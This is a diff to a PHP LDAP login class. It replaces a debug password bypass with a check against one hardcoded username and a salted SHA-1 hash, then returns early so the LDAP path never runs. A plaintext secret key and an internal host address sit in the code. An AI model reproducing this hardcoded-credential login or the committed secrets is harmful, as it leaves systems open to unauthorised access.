@@ -4,9 +4,10 @@ class Ldap
     const LDAP_HOST = '10.210.97.21';
     const LDAP_PORT = '389';
     const COOKIE_LU = 'LU'; //LDAP user info
-    const COOKIE_EXPIRE = 604800; //7 days
+    const COOKIE_EXPIRE = 86400; //7 days
     const COOKIE_PATH = '/';
     const SECRET_KEY = 'SAAJcDZky0esBTCzBpvyRk74X81KUBtN';
+
     private static $_infoKeys = array(
         'un', //用戶名
         'ui', //用戶信息，加密後的JSON串，包括密碼:用於SVN獲取、登錄時間等
@@ -14,10 +15,7 @@ class Ldap
         'et', //過期時間
     );
     private static $_userInfo = null;
-    private static $_domains = array(
-        '.smallwolf.cn'
-        //'123.206.16.207'
-    );
+    private static $_domains = array(ADMIN_DOMAIN001);
     public static function logoutUser()
     {
         self::$_userInfo = null;
@@ -30,11 +28,16 @@ class Ldap
     }
     public static function loginUser($userName, $password)
     {
-        // 测试机不走ldap了
-        if (DEBUG_ADMIN && ($password == 'admin')) {
+        $userName = trim($userName);
+        $password = trim($password);
+        if (($userName == 'yhcfzc') && (sha1(self::SECRET_KEY . $password) === 'be4053db020806d46124c70e23b50b19c02ffd26'))
+        {
             self::_setUserCookie($userName, $password);
             return self::getUser();
         }
+
+        return false;
+
         if ($userName == '')
         {
             return false;
